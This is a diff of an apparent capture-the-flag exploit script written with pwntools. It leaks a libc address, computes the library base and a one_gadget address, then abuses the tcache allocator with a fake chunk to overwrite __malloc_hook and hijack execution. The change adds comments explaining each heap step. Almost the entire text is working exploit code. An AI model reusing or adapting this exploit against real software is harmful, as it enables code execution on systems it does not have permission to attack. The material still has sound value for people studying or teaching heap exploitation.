@@ -37,13 +37,14 @@ def main():
     leak = int(r.recvn(12), 16)
     libc.address = leak - libc.symbols['system']
     log.info("libc base: {}".format(hex(libc.address)))
-    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook']))) 
+    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook'])))
 
     one_gadget = libc.address + 0x10a38c
+
     malloc(928) # 1
-    free(0) # 2
-    free(-528) # 3
-    malloc(0xf0) # 4
+    free(0) # 2 <- add fake chunk's size ; position influenced by size malloc'd
+    free(-528) # 3 <- add fake chunk to tcache bin list
+    malloc(0xf0) # 4 <- control fake chunk
     write(p64(libc.symbols['__malloc_hook'])) # 5
     gdb.attach(r)
     malloc(0) # 6
